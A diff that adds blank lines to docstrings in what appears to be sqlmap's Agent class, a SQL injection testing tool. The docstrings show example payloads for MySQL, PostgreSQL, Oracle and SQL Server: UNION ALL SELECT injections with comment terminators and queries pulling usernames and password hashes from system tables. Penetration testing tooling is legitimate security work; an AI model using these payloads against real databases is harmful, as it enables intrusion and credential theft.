@@ -452,21 +452,28 @@ class Agent(object):
         """
         Take in input a field string and return its processed nulled and
         casted field string.
+
         Examples:
+
         MySQL input:  VERSION()
         MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
         MySQL scope:  VERSION()
+
         PostgreSQL input:  VERSION()
         PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')
         PostgreSQL scope:  VERSION()
+
         Oracle input:  banner
         Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')
         Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1
+
         Microsoft SQL Server input:  @@VERSION
         Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')
         Microsoft SQL Server scope:  @@VERSION
+
         @param field: field string to be processed
         @type field: C{str}
+
         @return: field string nulled and casted
         @rtype: C{str}
         """
@@ -511,21 +518,28 @@ class Agent(object):
         """
         Take in input a sequence of fields string and return its processed
         nulled, casted and concatenated fields string.
+
         Examples:
+
         MySQL input:  user,password
         MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
         MySQL scope:  SELECT user, password FROM mysql.user
+
         PostgreSQL input:  usename,passwd
         PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
         PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow
+
         Oracle input:  COLUMN_NAME,DATA_TYPE
         Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
         Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'
+
         Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
         Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
         Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
+
         @param fields: fields string to be processed
         @type fields: C{str}
+
         @return: fields string nulled, casted and concatened
         @rtype: C{str}
         """
@@ -553,11 +567,15 @@ class Agent(object):
         """
         Take in input a query string and return its fields (columns) and
         more details.
+
         Example:
+
         Input:  SELECT user, password FROM mysql.user
         Output: user,password
+
         @param query: query to be processed
         @type query: C{str}
+
         @return: query fields (columns) and more details
         @rtype: C{str}
         """
@@ -644,17 +662,24 @@ class Agent(object):
         """
         Take in input a query string and return its processed nulled,
         casted and concatenated query string.
+
         Examples:
+
         MySQL input:  SELECT user, password FROM mysql.user
         MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user
+
         PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
         PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow
+
         Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
         Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
+
         Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
         Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins
+
         @param query: query string to be processed
         @type query: C{str}
+
         @return: query string nulled, casted and concatenated
         @rtype: C{str}
         """
@@ -786,21 +811,29 @@ class Agent(object):
         """
         Take in input an query (pseudo query) string and return its
         processed UNION ALL SELECT query.
+
         Examples:
+
         MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
         MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488
+
         PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
         PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713
+
         Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
         Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738
+
         Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
         Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254
+
         @param query: it is a processed query string unescaped to be
         forged within an UNION ALL SELECT statement
         @type query: C{str}
+
         @param position: it is the NULL position where it is possible
         to inject the query
         @type position: C{int}
+
         @return: UNION ALL SELECT query string forged
         @rtype: C{str}
         """
@@ -957,15 +990,21 @@ class Agent(object):
     def limitQuery(self, num, query, field=None, uniqueField=None):
         """
         Take in input a query string and return its limited query string.
+
         Example:
+
         Input:  SELECT user FROM mysql.users
         Output: SELECT user FROM mysql.users LIMIT <num>, 1
+
         @param num: limit number
         @type num: C{int}
+
         @param query: query to be processed
         @type query: C{str}
+
         @param field: field within the query
         @type field: C{list}
+
         @return: limited query string
         @rtype: C{str}
         """
@@ -1132,11 +1171,15 @@ class Agent(object):
         """
         Take in input a query string and return its CASE statement query
         string.
+
         Example:
+
         Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
         Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)
+
         @param expression: expression to be processed
         @type num: C{str}
+
         @return: processed expression
         @rtype: C{str}
         """
